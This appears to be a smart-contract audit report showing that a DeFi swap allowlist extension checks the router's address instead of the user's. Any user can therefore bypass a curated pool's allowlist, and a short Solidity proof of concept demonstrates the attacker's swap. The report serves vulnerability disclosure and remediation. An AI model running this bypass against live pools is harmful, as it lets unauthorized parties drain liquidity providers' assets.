### Title
`SwapAllowlistExtension` Checks Router Address Instead of Actual Swapper, Allowing Any User to Bypass the Per-User Allowlist - (File: metric-periphery/contracts/extensions/SwapAllowlistExtension.sol)

---

### Summary

`SwapAllowlistExtension.beforeSwap` gates swaps by checking the `sender` argument, which the pool sets to `msg.sender` of `pool.swap()`. When a user routes through `MetricOmmSimpleRouter`, the pool's `msg.sender` is the router contract, not the user. The extension therefore checks whether the **router** is allowlisted, not whether the **user** is allowlisted. Any pool admin who allowlists the router to enable router-mediated swaps simultaneously grants every user on-chain the ability to bypass the per-user allowlist entirely.

---

### Finding Description

`MetricOmmPool.swap` passes its own `msg.sender` as the `sender` argument to `_beforeSwap`:

```solidity
// MetricOmmPool.sol line 230-240
_beforeSwap(
    msg.sender,   // ← pool's msg.sender, not the original user
    recipient,
    ...
);
```

`ExtensionCalling._beforeSwap` forwards that value unchanged to every configured extension:

```solidity
// ExtensionCalling.sol line 160-176
_callExtensionsInOrder(
    BEFORE_SWAP_ORDER,
    abi.encodeCall(IMetricOmmExtensions.beforeSwap,
        (sender, recipient, ...))
);
```

`SwapAllowlistExtension.beforeSwap` then checks that `sender` against its per-pool allowlist:

```solidity
// SwapAllowlistExtension.sol line 37
if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
    revert IMetricOmmPoolActions.NotAllowedToSwap();
}
```

When a user calls `MetricOmmSimpleRouter.exactInputSingle` (or `exactInput`), the router calls `pool.swap()` directly:

```solidity
// MetricOmmSimpleRouter.sol line 72-80
(int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
    .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
    );
```

The router passes no user-identity argument to `pool.swap()`. The pool's `swap()` interface has no `sender` parameter; it uses `msg.sender` internally. So the pool sees `msg.sender = router`, and the extension receives `sender = router`.

The extension has no mechanism to recover the original user's address. The pool's `swap()` signature is:

```solidity
function swap(address recipient, bool zeroForOne, int128 amountSpecified,
              uint128 priceLimitX64, bytes calldata callbackData,
              bytes calldata extensionData) external returns (int128, int128);
```

None of these fields carry the originating user. The `extensionData` is caller-supplied and therefore untrusted for identity purposes.

This creates an irresolvable dilemma for any pool admin who deploys a curated pool with `SwapAllowlistExtension`:

| Admin choice | Effect |
|---|---|
| Allowlist the router | Every user on-chain can bypass the per-user allowlist via the router |
| Do not allowlist the router | Even allowlisted users cannot use the router; they must call `pool.swap()` directly |

---

### Impact Explanation

A pool admin deploys a curated pool (e.g., for KYC-verified counterparties, institutional LPs, or a restricted trading venue) and configures `SwapAllowlistExtension` to enforce per-user access control. To allow allowlisted users to use the standard periphery router, the admin must allowlist the router address. Once the router is allowlisted, the `allowedSwapper` mapping is effectively dead: any address on-chain can call `router.exactInputSingle()` and the extension will pass the check because it sees `sender = router`. The allowlist guard is silently open to the entire public, breaking the core invariant the extension was deployed to enforce. Unauthorized users can extract value from pools priced for specific counterparties, violate compliance requirements, or drain LP assets at favorable oracle-anchored rates that were never intended to be publicly accessible.

---

### Likelihood Explanation

The router is the primary user-facing entry point for the protocol. Any pool admin who wants allowlisted users to have a normal UX must allowlist the router. The bypass requires no special knowledge, no privileged access, and no unusual token behavior — any user simply calls `router.exactInputSingle()` with a non-zero `amountIn`. The vulnerability is always reachable on any curated pool that has allowlisted the router.

---

### Recommendation

The `sender` argument delivered to `beforeSwap` must represent the economically responsible actor, not the immediate caller of `pool.swap()`. Two sound approaches:

1. **Pass the original user through `extensionData` with router-level authentication**: The router signs or encodes the originating `msg.sender` into `extensionData`, and the extension verifies it came from a trusted router. This requires a trusted-router registry.

2. **Check `recipient` instead of `sender` for swap allowlists**: If the pool's design guarantees that the recipient is always the economically responsible party, the extension can gate on `recipient`. This requires careful analysis of the pool's recipient semantics.

3. **Document that `SwapAllowlistExtension` only gates direct `pool.swap()` callers** and that router-mediated swaps require a separate allowlist entry for the router, with a clear warning that allowlisting the router opens the pool to all users.

The cleanest fix is to redesign the extension interface so that the pool passes both `msg.sender` (the immediate caller) and an authenticated originator (e.g., recovered from a signed payload in `extensionData`).

---

### Proof of Concept

```solidity
// Setup: pool admin deploys curated pool with SwapAllowlistExtension
// Admin allowlists the router so that KYC'd users can use it
swapExtension.setAllowedToSwap(address(pool), address(router), true);
// Admin does NOT allowlist attacker
// allowedSwapper[pool][attacker] == false

// Attacker (not allowlisted) calls the router directly
vm.prank(attacker); // attacker is not in allowedSwapper
router.exactInputSingle(
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool:            address(pool),
        tokenIn:         address(token0),
        tokenOut:        address(token1),
        zeroForOne:      true,
        amountIn:        1_000_000,
        amountOutMinimum: 0,
        recipient:       attacker,
        deadline:        block.timestamp + 1,
        priceLimitX64:   0,
        extensionData:   ""
    })
);
// ✓ Swap succeeds — extension saw sender=router (allowlisted), not attacker
// Attacker receives token1 output from a pool they were never authorized to access
```

Call trace:
1. `attacker` → `MetricOmmSimpleRouter.exactInputSingle()`
2. Router → `MetricOmmPool.swap(recipient=attacker, ...)` — pool sees `msg.sender = router`
3. Pool → `ExtensionCalling._beforeSwap(sender=router, ...)`
4. Extension → `allowedSwapper[pool][router]` → `true` → **no revert**
5. Swap executes; attacker receives output tokens from the curated pool [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-core/contracts/ExtensionCalling.sol (L149-177)
```text
  function _beforeSwap(
    address sender,
    address recipient,
    bool zeroForOne,
    int128 amountSpecified,
    uint128 priceLimitX64,
    uint256 packedSlot0Initial,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```
